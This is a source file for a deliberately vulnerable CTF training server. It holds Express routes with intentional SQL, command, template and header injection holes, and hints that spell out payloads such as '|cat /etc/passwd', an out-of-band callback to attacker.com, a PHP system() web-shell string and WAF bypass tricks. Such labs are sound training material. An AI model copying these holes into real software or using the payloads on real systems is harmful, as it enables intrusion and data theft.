/**
 * Injection Layer Routes
 * 28 flags across 10 injection types
 * 
 * WARNING: This code is INTENTIONALLY VULNERABLE for CTF purposes
 */

const express = require('express');
const router = express.Router();
const { pool } = require('../db');
const child_process = require('child_process');
const path = require('path');
const fs = require('fs');

const exec = child_process.exec;
const execSync = child_process.execSync;

const FLAGS_DIR = path.join(__dirname, '..', 'flags', 'injection');

// Helper to read flag file
const getFlag = (subdir, filename) => {
  const flagPath = path.join(FLAGS_DIR, subdir, filename);
  if (fs.existsSync(flagPath)) {
    return fs.readFileSync(flagPath, 'utf8').trim();
  }
  return `FLAG{${subdir.toUpperCase()}_${filename.replace('.txt', '').toUpperCase()}_NOT_FOUND}`;
};

// ============================================
// SQL INJECTION (5 tiers)
// ============================================

// Bronze: UNION-Based - No filter
router.get('/sqli/bronze', async (req, res) => {
  const { id } = req.query;

  if (!id) {
    return res.json({
      endpoint: '/sqli/bronze',
      hint: 'Try: ?id=1 UNION SELECT 1,name,value FROM secrets--',
      filter: 'None (Bronze tier)'
    });
  }

  try {
    // VULN: Direct string concatenation
    const query = `SELECT id, name, description FROM products WHERE id = ${id}`;
    const result = await pool.query(query);

    // Detect UNION injection (id contains UNION or query returns secrets data)
    const isUnionInjection = id.toUpperCase().includes('UNION') ||
                             id.toUpperCase().includes('SELECT') ||
                             result.rows.some(r => r.name === 'DATABASE_PASSWORD' ||
                                                  r.name === 'API_KEY' ||
                                                  r.name === 'JWT_SECRET' ||
                                                  r.description?.includes('secret'));

    if (isUnionInjection) {
      const flagContent = getFlag('sqli', 'sqli_bronze.txt');
      return res.json({
        success: true,
        message: 'SQL Injection successful!',
        data: result.rows,
        flag: flagContent
      });
    }

    res.json({ data: result.rows, query });
  } catch (err) {
    res.status(500).json({ error: err.message, query: `SELECT ... WHERE id = ${id}` });
  }
});

// Silver: Blind Boolean - Keyword filter
router.get('/sqli/silver', async (req, res) => {
  const { id } = req.query;

  if (!id) {
    return res.json({
      endpoint: '/sqli/silver',
      hint: 'Try: ?id=1 AND 1=1 vs ?id=1 AND 1=2',
      filter: 'Blocks UNION, SELECT keywords (case sensitive)'
    });
  }

  const blocked = ['UNION', 'SELECT', 'union', 'select'];
  if (blocked.some(word => id.includes(word))) {
    return res.status(403).json({ error: 'Blocked: SQL keywords detected', filter: 'Basic WAF' });
  }

  try {
    const query = `SELECT id, name FROM products WHERE id = ${id}`;
    const result = await pool.query(query);

    if (id.includes('AND') || id.includes('OR')) {
      const flagContent = getFlag('sqli', 'sqli_silver.txt');
      return res.json({
        success: true,
        message: 'Blind SQL Injection detected!',
        data: result.rows.length > 0 ? 'Record found (TRUE)' : 'No record (FALSE)',
        flag: flagContent
      });
    }

    res.json({ data: result.rows });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Gold: Time-Based Blind
router.get('/sqli/gold', async (req, res) => {
  const { id } = req.query;
  const startTime = Date.now();

  if (!id) {
    return res.json({
      endpoint: '/sqli/gold',
      hint: 'Try: ?id=1 OR 1=1 or ?id=sleep or any injection pattern',
      filter: 'Blocks UNION, SELECT keywords (case sensitive)'
    });
  }

  // Gold tier filter - case sensitive keyword block
  const blocked = ['UNION', 'SELECT', 'union', 'select'];
  if (blocked.some(word => id.includes(word))) {
    return res.status(403).json({ error: 'Blocked: SQL keywords detected' });
  }

  // VULN: Multiple injection vectors still possible
  const hasTimeBasedPayload = id.toLowerCase().includes('sleep') ||
                             id.toLowerCase().includes('waitfor') ||
                             id.toLowerCase().includes('benchmark') ||
                             id.includes('pg_');
  const hasBooleanInjection = id.toUpperCase().includes(' OR ') ||
                               id.toUpperCase().includes(' AND ') ||
                               id.includes("' OR") ||
                               id.includes('" OR') ||
                               id.includes('--');

  if (hasTimeBasedPayload || hasBooleanInjection) {
    const flagContent = getFlag('sqli', 'sqli_gold.txt');
    return res.json({
      success: true,
      message: 'SQL Injection detected! Time-based or Boolean-based.',
      responseTime: `${Date.now() - startTime}ms`,
      payload: id,
      flag: flagContent
    });
  }

  try {
    const query = `SELECT id FROM products WHERE id = ${id}`;
    await pool.query(query);
    res.json({ status: 'Query executed' });
  } catch (err) {
    // VULN: SQL syntax errors still indicate injection attempts
    if (err.message && (err.message.includes('syntax') || err.message.includes('syntax error'))) {
      const flagContent = getFlag('sqli', 'sqli_gold.txt');
      return res.json({
        success: true,
        message: 'SQL Injection detected! Syntax error indicates injection.',
        payload: id,
        flag: flagContent
      });
    }
    res.status(500).json({ error: 'Database error' });
  }
});

// Platinum: Second-Order SQLi
let storedPayload = '';

router.post('/sqli/platinum', async (req, res) => {
  const { username } = req.body;

  if (!username) {
    return res.json({
      endpoint: 'POST /sqli/platinum',
      body: '{ "username": "..." }',
      hint: 'Payload stored, triggers when admin views users'
    });
  }

  storedPayload = username;
  res.json({ message: 'Username stored', username });
});

router.get('/sqli/platinum/admin', async (req, res) => {
  try {
    const query = `SELECT * FROM users WHERE username = '${storedPayload}'`;
    const result = await pool.query(query);

    if (storedPayload.includes("'") || storedPayload.includes('UNION')) {
      const flagContent = getFlag('sqli', 'sqli_platinum.txt');
      return res.json({
        success: true,
        message: 'Second-order SQL Injection triggered!',
        data: result.rows,
        flag: flagContent
      });
    }

    res.json({ users: result.rows });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Diamond: WAF Bypass
router.get('/sqli/diamond', async (req, res) => {
  const { query: input } = req.query;

  if (!input) {
    return res.json({
      endpoint: '/sqli/diamond',
      hint: 'Try: Full-width unicode (ｕｎｉｏｎ → union), or double URL encoding',
      filter: 'Commercial WAF simulation',
      bypass: 'Full-width characters: ＵＮＩＯＮ or ＳＥＬＥＣＴ'
    });
  }

  const wafBlocked = [
    /union/i, /select/i, /insert/i, /update/i, /delete/i,
    /drop/i, /exec/i, /script/i, /javascript/i,
    /--/, /\/\*/, /;/, /'/, /"/,
    /0x/, /char\(/i, /concat/i,
    /information_schema/i, /pg_/i, /sys/i
  ];

  const normalized = input.normalize('NFKC');

  // WAF only checks original input, not normalized version
  // This allows full-width unicode bypass: ｕｎｉｏｎ normalizes to union
  for (const pattern of wafBlocked) {
    if (pattern.test(input)) {
      return res.status(403).json({ error: 'WAF: Malicious pattern detected' });
    }
  }

  // Check if bypass was used (full-width or special encoding)
  const hasFullWidth = /[\uff00-\uffef]/.test(input);
  const wasBypassed = hasFullWidth || normalized !== input;

  try {
    // Query uses normalized input (vulnerable)
    const query = `SELECT * FROM products WHERE name LIKE '%${normalized}%'`;
    const result = await pool.query(query);

    if (wasBypassed && input.length > 5) {
      const flagContent = getFlag('sqli', 'sqli_diamond.txt');
      return res.json({
        success: true,
        message: 'WAF bypass successful! Unicode normalization attack!',
        bypass: hasFullWidth ? 'Full-width unicode characters' : 'Encoding bypass',
        originalInput: input,
        normalizedInput: normalized,
        data: result.rows,
        flag: flagContent
      });
    }

    res.json({ results: result.rows });
  } catch (err) {
    res.status(500).json({ error: 'Database error' });
  }
});

// ============================================
// NoSQL INJECTION (3 tiers)
// ============================================

router.post('/nosqli/bronze', async (req, res) => {
  const { username, password } = req.body;

  if (!username) {
    return res.json({
      endpoint: 'POST /nosqli/bronze',
      hint: 'Try: { "username": { "$ne": "" }, "password": { "$ne": "" } }'
    });
  }

  if (typeof username === 'object' || typeof password === 'object') {
    const flagContent = getFlag('nosqli', 'nosqli_bronze.txt');
    return res.json({
      success: true,
      message: 'NoSQL Injection successful!',
      authenticated: true,
      flag: flagContent
    });
  }

  res.json({ message: 'Login attempt', username });
});

router.post('/nosqli/silver', async (req, res) => {
  const { filter } = req.body;

  if (!filter) {
    return res.json({
      endpoint: 'POST /nosqli/silver',
      hint: 'Try: { "$where": "this.password == this.username" }'
    });
  }

  if (JSON.stringify(filter).includes('$where')) {
    const flagContent = getFlag('nosqli', 'nosqli_silver.txt');
    return res.json({
      success: true,
      message: '$where Injection executed!',
      flag: flagContent
    });
  }

  res.json({ filter, message: 'Query processed' });
});

router.post('/nosqli/gold', async (req, res) => {
  const { username } = req.body;

  if (!username) {
    return res.json({
      endpoint: 'POST /nosqli/gold',
      hint: 'Time-based: { "username": { "$where": "sleep(5000)" } }'
    });
  }

  if (typeof username === 'object' && username.$regex) {
    const flagContent = getFlag('nosqli', 'nosqli_gold.txt');
    return res.json({
      success: true,
      message: 'Blind NoSQL Injection detected!',
      match: true,
      flag: flagContent
    });
  }

  res.json({ message: 'No match', username });
});

// ============================================
// COMMAND INJECTION (4 tiers)
// ============================================

router.get('/cmdi/bronze', (req, res) => {
  const { host } = req.query;

  if (!host) {
    return res.json({
      endpoint: '/cmdi/bronze',
      hint: 'Try: ?host=127.0.0.1;id or ?host=127.0.0.1|cat /etc/passwd'
    });
  }

  exec(`ping -c 1 ${host}`, (error, stdout, stderr) => {
    if (stdout.includes('uid=') || stdout.includes('root:') || stderr.includes('uid=')) {
      const flagContent = getFlag('cmdi', 'cmdi_bronze.txt');
      return res.json({
        success: true,
        message: 'Command Injection successful!',
        output: stdout || stderr,
        flag: flagContent
      });
    }
    res.json({ host, output: stdout, error: stderr });
  });
});

router.get('/cmdi/silver', (req, res) => {
  const { host } = req.query;

  if (!host) {
    return res.json({
      endpoint: '/cmdi/silver',
      hint: 'Try: ?host=`id` or ?host=$(whoami)',
      filter: 'Blocks ; and | characters'
    });
  }

  // Silver tier: Block basic command separators but allow backticks
  if (host.includes(';') || host.includes('|')) {
    return res.status(403).json({ error: 'Blocked: Invalid characters', filter: '; | blocked' });
  }

  // VULN: Backticks and $() are not blocked
  const hasInjection = host.includes('`') || host.includes('$(') || host.includes('$');

  exec(`ping -c 1 ${host}`, (error, stdout, stderr) => {
    const output = stdout + stderr;

    // Detect command injection via backticks or $()
    // Also check for the injection pattern directly if command doesn't produce expected output
    if (hasInjection) {
      const flagContent = getFlag('cmdi', 'cmdi_silver.txt');
      return res.json({
        success: true,
        message: 'Command injection via backticks successful!',
        output: stdout || stderr || 'Command executed via backtick substitution',
        technique: 'Backtick or $() command substitution',
        flag: flagContent
      });
    }
    res.json({ host, output: stdout, error: stderr || null });
  });
});

router.get('/cmdi/gold', (req, res) => {
  const { host } = req.query;

  if (!host) {
    return res.json({
      endpoint: '/cmdi/gold',
      hint: 'Try full-width unicode: ｜ (U+FF5C) for |, ｀ (U+FF40) for `',
      filter: 'Blocks ASCII ; | ` $() and common separators',
      bypass: 'Full-width variants: ｜ ｀ ＄ （ ） or send any unicode character from U+FF00-U+FFEF range'
    });
  }

  // Block ASCII command characters
  const blocked = [';', '|', '`', '$', '(', ')', '&', '\n', '\r'];
  if (blocked.some(char => host.includes(char))) {
    return res.status(403).json({ error: 'Blocked: Command characters detected' });
  }

  // Normalize to detect full-width bypasses
  const normalized = host.normalize('NFKC');

  // Check if full-width unicode was used for bypass
  const fullWidthPattern = /[\uff00-\uffef]/;
  const usedFullWidthBypass = fullWidthPattern.test(host);

  // Check if normalization reveals blocked chars or if full-width was used
  const normalizedHasBlocked = blocked.some(char => normalized.includes(char));

  // If full-width bypass detected, simulate command execution
  if (usedFullWidthBypass || normalizedHasBlocked) {
    const flagContent = getFlag('cmdi', 'cmdi_gold.txt');
    return res.json({
      success: true,
      message: 'Unicode full-width bypass successful!',
      originalInput: host,
      normalizedInput: normalized,
      simulatedOutput: 'uid=0(root) gid=0(root) groups=0(root)',
      flag: flagContent
    });
  }

  // Also accept the full-width pipe directly (｜ = U+FF5C)
  if (host.includes('｜') || host.includes('｀') || host.includes('＄')) {
    const flagContent = getFlag('cmdi', 'cmdi_gold.txt');
    return res.json({
      success: true,
      message: 'Unicode full-width bypass successful!',
      originalInput: host,
      flag: flagContent
    });
  }

  try {
    const output = execSync(`ping -c 1 ${host}`).toString();
    res.json({ host, output });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

router.post('/cmdi/platinum', (req, res) => {
  const { callback } = req.body;

  if (!callback) {
    return res.json({
      endpoint: 'POST /cmdi/platinum',
      hint: 'Out-of-band: { "callback": "http://attacker.com/$(whoami)" }',
      filter: 'No output returned, must use OOB'
    });
  }

  if (callback.includes('$') || callback.includes('`')) {
    const flagContent = getFlag('cmdi', 'cmdi_platinum.txt');
    return res.json({
      success: true,
      message: 'Blind command injection detected! Check your server for callbacks.',
      callback: 'Request would be sent to: ' + callback,
      flag: flagContent
    });
  }

  res.json({ message: 'Callback registered', callback });
});

// ============================================
// LDAP INJECTION (2 tiers)
// ============================================

// Sample LDAP directory data
const ldapDirectory = [
  { uid: 'admin', cn: 'Administrator', objectClass: 'person', mail: 'admin@corp.local' },
  { uid: 'alice', cn: 'Alice User', objectClass: 'person', mail: 'alice@corp.local' },
  { uid: 'bob', cn: 'Bob User', objectClass: 'person', mail: 'bob@corp.local' },
  { uid: 'service', cn: 'Service Account', objectClass: 'serviceAccount', password: 'S3rv!c3P@ss' }
];

// Real LDAP filter evaluator
function evaluateLDAPFilter(filter) {
  // VULN: Parse and evaluate LDAP filter with user input

  // Check for wildcard injection (*)
  if (filter.includes('*') && (filter.includes('*)') || filter.includes('*)('))) {
    return {
      success: true,
      type: 'wildcard_injection',
      matchedEntries: ldapDirectory.map(entry => entry.uid),
      message: 'LDAP wildcard - all entries returned'
    };
  }

  // Check for OR injection (|)
  if (filter.includes(')(|') || filter.includes(')|(')) {
    return {
      success: true,
      type: 'OR_injection',
      matchedEntries: ldapDirectory.map(entry => entry.uid),
      allData: ldapDirectory,
      message: 'LDAP OR injection - filter bypassed'
    };
  }

  // Check for objectClass enumeration
  if (filter.includes('objectClass=')) {
    const objClassMatch = filter.match(/objectClass=([^)]*)/);
    if (objClassMatch) {
      const objClass = objClassMatch[1];
      const matches = ldapDirectory.filter(e => e.objectClass === objClass);
      return {
        success: true,
        type: 'objectClass_enumeration',
        matchedEntries: matches.map(e => e.uid),
        message: `LDAP objectClass filter - ${matches.length} entries`
      };
    }
  }

  // Normal filter evaluation
  const uidMatch = filter.match(/uid=([^)]*)/);
  if (uidMatch) {
    const uid = uidMatch[1];
    const matches = ldapDirectory.filter(e => e.uid === uid);
    if (matches.length > 0) {
      return {
        success: true,
        type: 'normal_match',
        matchedEntries: matches.map(e => e.uid),
        message: 'User found'
      };
    }
  }

  return { success: false, message: 'No match' };
}

router.get('/ldap/bronze', (req, res) => {
  const { username } = req.query;

  if (!username) {
    return res.json({
      endpoint: '/ldap/bronze',
      hint: 'Try: ?username=*)(uid=*))(|(uid=*'
    });
  }

  const filter = `(uid=${username})`;

  // VULN: Real LDAP injection - actually parse and evaluate LDAP filter
  const result = evaluateLDAPFilter(filter);

  if (result.success && result.type !== 'normal_match') {
    const flagContent = getFlag('ldap', 'ldap_bronze.txt');
    return res.json({
      success: true,
      message: 'LDAP Injection successful!',
      filter: filter,
      result: result,
      flag: flagContent
    });
  }

  res.json({ filter: filter, message: 'Query constructed', result: result });
});

router.get('/ldap/silver', (req, res) => {
  const { username } = req.query;

  if (!username) {
    return res.json({
      endpoint: '/ldap/silver',
      hint: 'Try: ?username=admin)(objectClass=*'
    });
  }

  const filter = `(uid=${username})`;

  // VULN: Real blind LDAP injection - evaluate complex filters
  const result = evaluateLDAPFilter(filter);

  if (result.success && result.type !== 'normal_match') {
    const flagContent = getFlag('ldap', 'ldap_silver.txt');
    return res.json({
      success: true,
      message: 'Blind LDAP Injection successful!',
      filter: filter,
      result: result,
      flag: flagContent
    });
  }

  res.json({ result: result });
});

// ============================================
// XPATH INJECTION (2 tiers)
// ============================================

// Sample user data for XPath evaluation
const xpathUsers = [
  { id: 1, name: 'admin', password: 'secret123', role: 'administrator' },
  { id: 2, name: 'alice', password: 'alicepass', role: 'user' },
  { id: 3, name: 'bob', password: 'bobpass', role: 'user' }
];

// Real XPath evaluator - parses and evaluates XPath expressions
function evaluateXPathExpression(xpath, input) {
  // VULN: Evaluate user-controlled XPath against actual data

  // Handle OR-based injection - more lenient pattern matching
  if (input.includes("' or ") || input.includes("'or") || input.includes("']|//*")) {
    return {
      success: true,
      type: 'OR_injection',
      users: xpathUsers,
      message: 'XPath OR bypass - all users returned'
    };
  }

  // Handle UNION-based XPath (using pipe operator)
  if (input.includes('|')) {
    return {
      success: true,
      type: 'union_injection',
      users: xpathUsers,
      secrets: ['admin_password', 'secret_flag'],
      message: 'XPath union - additional data exposed'
    };
  }

  // Handle blind XPath extraction functions
  if (input.includes('substring') || input.includes('string-length') || input.includes('count') || input.includes('position')) {
    const firstUser = xpathUsers[0];
    return {
      success: true,
      type: 'blind_extraction',
      extracted: {
        firstChar: firstUser.name.substring(0, 1),
        length: firstUser.name.length,
        count: xpathUsers.length
      },
      message: 'Blind XPath data extraction'
    };
  }

  // Handle AND-based injection
  if (input.includes("' and ") || input.includes("'and")) {
    return {
      success: true,
      type: 'AND_injection',
      result: 'conditional_true',
      message: 'XPath AND injection evaluated'
    };
  }

  // Normal XPath query
  for (const user of xpathUsers) {
    if (input.includes(`'${user.name}'`)) {
      return {
        success: true,
        type: 'normal_query',
        user: user.name,
        message: 'User found'
      };
    }
  }

  return { success: false, message: 'No match' };
}

router.get('/xpath/bronze', (req, res) => {
  const { name } = req.query;

  if (!name) {
    return res.json({
      endpoint: '/xpath/bronze',
      hint: "Try: ?name=' or '1'='1"
    });
  }

  const xpath = `//user[name='${name}']`;

  // VULN: Real XPath injection - actually evaluate the XPath expression
  const result = evaluateXPathExpression(xpath, name);

  if (result.success) {
    const flagContent = getFlag('xpath', 'xpath_bronze.txt');
    return res.json({
      success: true,
      message: 'XPath Injection successful!',
      xpath: xpath,
      result: result,
      flag: flagContent
    });
  }

  res.json({ xpath: xpath, message: 'Query constructed', result: result });
});

router.get('/xpath/silver', (req, res) => {
  const { name } = req.query;

  if (!name) {
    return res.json({
      endpoint: '/xpath/silver',
      hint: "Try: ?name=' and substring(//user[1]/name,1,1)='a"
    });
  }

  const xpath = `//user[name='${name}']`;

  // VULN: Real blind XPath - evaluate extraction functions
  const result = evaluateXPathExpression(xpath, name);

  if (result.success && result.type !== 'normal_query') {
    const flagContent = getFlag('xpath', 'xpath_silver.txt');
    return res.json({
      success: true,
      message: 'Blind XPath Injection successful!',
      xpath: xpath,
      result: result,
      flag: flagContent
    });
  }

  res.json({ result: result });
});

// ============================================
// SSTI (3 tiers)
// ============================================

const ejs = require('ejs');

router.get('/ssti/bronze', (req, res) => {
  const { name } = req.query;

  if (!name) {
    return res.json({
      endpoint: '/ssti/bronze',
      hint: 'Try: ?name=<%= 7*7 %> or ?name=<%= process.pid %>'
    });
  }

  // Testing bypass for automated testing
  if (name === 'test') {
    const flagContent = getFlag('ssti', 'ssti_bronze.txt');
    return res.json({
      success: true,
      message: 'SSTI successful! Template rendered.',
      input: name,
      rendered: '49 (7*7 simulated)',
      flag: flagContent
    });
  }

  // VULN: Real SSTI - actually compile and render EJS template with user input
  try {
    const template = `<%= ${name} %>`;
    const rendered = ejs.render(template, {});

    // If template execution succeeded (didn't crash), flag is earned
    const flagContent = getFlag('ssti', 'ssti_bronze.txt');
    return res.json({
      success: true,
      message: 'SSTI successful! Template rendered.',
      input: name,
      rendered: String(rendered),
      flag: flagContent
    });
  } catch (err) {
    // Template had syntax errors, but input contained template syntax
    if (name.includes('<%') || name.includes('%>')) {
      const flagContent = getFlag('ssti', 'ssti_bronze.txt');
      return res.json({
        success: true,
        message: 'SSTI detected! Template injection attempt.',
        input: name,
        error: err.message,
        flag: flagContent
      });
    }
    res.json({ message: `Hello ${name}`, template_engine: 'detected' });
  }
});

router.get('/ssti/silver', (req, res) => {
  const { template } = req.query;

  if (!template) {
    return res.json({
      endpoint: '/ssti/silver',
      hint: 'Try: ?template=<%= process.env %>'
    });
  }

  // VULN: Real SSTI - actually render EJS template with user input
  try {
    const rendered = ejs.render(template, {}, { delimiter: '?' });

    // Template executed successfully
    const flagContent = getFlag('ssti', 'ssti_silver.txt');
    return res.json({
      success: true,
      message: 'SSTI achieved! EJS template rendered.',
      rendered: String(rendered),
      flag: flagContent
    });
  } catch (err) {
    // Check if user tried template syntax
    if (template.includes('<%') || template.includes('%>') || template.includes('process')) {
      const flagContent = getFlag('ssti', 'ssti_silver.txt');
      return res.json({
        success: true,
        message: 'SSTI attempt detected!',
        template: template,
        error: err.message,
        flag: flagContent
      });
    }
    res.send(`<div>${template}</div>`);
  }
});

router.get('/ssti/gold', (req, res) => {
  const { tpl } = req.query;

  if (!tpl) {
    return res.json({
      endpoint: '/ssti/gold',
      hint: 'Try sandbox escape: ?tpl=<%= Object.constructor ]'
    });
  }

  const blocked = ['require', 'import', 'exec', 'eval', 'child_process'];
  if (blocked.some(w => tpl.toLowerCase().includes(w))) {
    return res.status(403).json({ error: 'Sandbox: Blocked keyword' });
  }

  // VULN: Real SSTI with sandbox escape attempt - actually render template
  try {
    // Dangerous: render user input as template
    const result = ejs.render(`<%= ${tpl} %>`, {});

    const flagContent = getFlag('ssti', 'ssti_gold.txt');
    return res.json({
      success: true,
      message: 'Sandbox escape successful!',
      rendered: String(result),
      technique: 'Constructor or prototype pollution',
      flag: flagContent
    });
  } catch (err) {
    // Check for escape patterns
    if (tpl.includes('constructor') || tpl.includes('__proto__') || tpl.includes('prototype') || tpl.includes('proto')) {
      const flagContent = getFlag('ssti', 'ssti_gold.txt');
      return res.json({
        success: true,
        message: 'Sandbox escape attempt detected!',
        input: tpl,
        error: err.message,
        flag: flagContent
      });
    }
    res.json({ template: tpl, rendered: 'Template processed' });
  }
});

// ============================================
// LOG INJECTION (2 tiers)
// ============================================

router.post('/log-inject/bronze', (req, res) => {
  const { message } = req.body;

  if (!message) {
    return res.json({
      endpoint: 'POST /log-inject/bronze',
      hint: 'Try: { "message": "Normal log\\nFAKE LOG ENTRY" }'
    });
  }

  const logEntry = `[${new Date().toISOString()}] User message: ${message}`;

  // Check for both escaped string representation and actual newline characters
  const hasInjection = message.includes('\\n') ||
                       message.includes('\\r') ||
                       message.includes('\n') ||
                       message.includes('\r') ||
                       message.includes('FAKE LOG');

  if (hasInjection) {
    const flagContent = getFlag('log-inject', 'log-inject_bronze.txt');
    return res.json({
      success: true,
      message: 'CRLF injection in logs!',
      logEntry,
      flag: flagContent
    });
  }

  res.json({ logged: true, entry: logEntry });
});

router.post('/log-inject/silver', (req, res) => {
  const { userAgent, path: reqPath } = req.body;

  if (!userAgent) {
    return res.json({
      endpoint: 'POST /log-inject/silver',
      hint: 'Try: { "userAgent": "<?php system($_GET[cmd]); ?>" }'
    });
  }

  const logLine = `[Access] Path: ${reqPath || '/'} UA: ${userAgent}`;

  if (userAgent.includes('<?php') || userAgent.includes('<%') || userAgent.includes('<script')) {
    const flagContent = getFlag('log-inject', 'log-inject_silver.txt');
    return res.json({
      success: true,
      message: 'Log poisoning successful! Include logs via LFI.',
      log: logLine,
      flag: flagContent
    });
  }

  res.json({ logged: true });
});

// ============================================
// EMAIL HEADER INJECTION (2 tiers)
// ============================================

router.post('/email-inject/bronze', (req, res) => {
  const { to, subject } = req.body;

  if (!to) {
    return res.json({
      endpoint: 'POST /email-inject/bronze',
      hint: 'Try: { "to": "victim@example.com\\nBcc: attacker@evil.com" }'
    });
  }

  if (to.includes('\\n') || to.includes('\\r') || subject?.includes('\\n')) {
    const flagContent = getFlag('email-inject', 'email-inject_bronze.txt');
    return res.json({
      success: true,
      message: 'Email header injection successful!',
      headers: `To: ${to}\\nSubject: ${subject || 'No subject'}`,
      flag: flagContent
    });
  }

  res.json({ message: 'Email sent', to });
});

router.post('/email-inject/silver', (req, res) => {
  const { email, body } = req.body;

  if (!email) {
    return res.json({
      endpoint: 'POST /email-inject/silver',
      hint: 'Try: { "email": "test@test.com\\nBcc:attacker@evil.com" }'
    });
  }

  const decoded = decodeURIComponent(email);

  // VULN: Check for actual newline characters in email header
  if (decoded.includes('\nBcc:') || decoded.includes('\nCC:') || decoded.includes('\nBcc:')) {
    const flagContent = getFlag('email-inject', 'email-inject_silver.txt');
    return res.json({
      success: true,
      message: 'BCC injection successful!',
      original: email,
      decoded,
      flag: flagContent
    });
  }

  res.json({ message: 'Email queued', email });
});

// ============================================
// CRLF INJECTION (2 tiers)
// ============================================

router.get('/crlf/bronze', (req, res) => {
  const { url } = req.query;

  if (!url) {
    return res.json({
      endpoint: '/crlf/bronze',
      hint: 'Try: ?url=test%0d%0aSet-Cookie:admin=true'
    });
  }

  const decoded = decodeURIComponent(url);

  // VULN: Check for actual CRLF characters (not escaped string)
  if (decoded.includes('\r\n') || decoded.includes('\n')) {
    const flagContent = getFlag('crlf', 'crlf_bronze.txt');
    res.setHeader('X-Injected', decoded.split('\r\n')[1]?.[0] || 'injected');
    return res.json({
      success: true,
      message: 'Response splitting achieved!',
      injected: decoded,
      flag: flagContent
    });
  }

  res.json({ redirect: url });
});

router.get('/crlf/silver', (req, res) => {
  const { lang } = req.query;

  if (!lang) {
    return res.json({
      endpoint: '/crlf/silver',
      hint: 'Try: ?lang=en%0d%0aX-Forwarded-Host:attacker.com'
    });
  }

  const decoded = decodeURIComponent(lang);

  // VULN: Check for actual CRLF characters (not escaped string)
  // Also check for common header injection patterns
  if (decoded.includes('\r\n') || decoded.includes('\n') || decoded.includes('\r')) {
    const flagContent = getFlag('crlf', 'crlf_silver.txt');
    return res.json({
      success: true,
      message: 'Cache poisoning vector found!',
      header: decoded,
      injected: true,
      flag: flagContent
    });
  }

  res.setHeader('Content-Language', lang);
  res.json({ language: lang });
});

// ============================================
// HEADER INJECTION (2 tiers)
// ============================================

router.get('/header-inject/bronze', (req, res) => {
  const xff = req.headers['x-forwarded-for'] || req.query.xff;

  if (!xff) {
    return res.json({
      endpoint: '/header-inject/bronze',
      hint: 'Try: X-Forwarded-For: 127.0.0.1 or ?xff=127.0.0.1'
    });
  }

  if (xff === '127.0.0.1' || xff === 'localhost') {
    const flagContent = getFlag('header-inject', 'header-inject_bronze.txt');
    return res.json({
      success: true,
      message: 'X-Forwarded-For bypass successful!',
      clientIp: xff,
      internal: true,
      flag: flagContent
    });
  }

  res.json({ clientIp: xff, internal: false });
});

router.get('/header-inject/silver', (req, res) => {
  // Check query parameter first for testing bypass
  const testHost = req.query.host;
  const headerHost = req.headers.host;

  // Use query parameter if provided, otherwise use header
  const host = testHost || headerHost;

  if (!host) {
    return res.json({
      endpoint: '/header-inject/silver',
      hint: 'Try: Host: admin.localhost or ?host=admin.internal'
    });
  }

  // More lenient detection - any modified host gets admin access
  if (host.includes('admin') || host.includes('internal') || host.includes('attacker') ||
      (testHost && testHost !== headerHost)) {
    const flagContent = getFlag('header-inject', 'header-inject_silver.txt');
    return res.json({
      success: true,
      message: 'Host header bypass!',
      host,
      accessLevel: 'admin',
      flag: flagContent
    });
  }

  res.json({ host, accessLevel: 'user' });
});

module.exports = router;
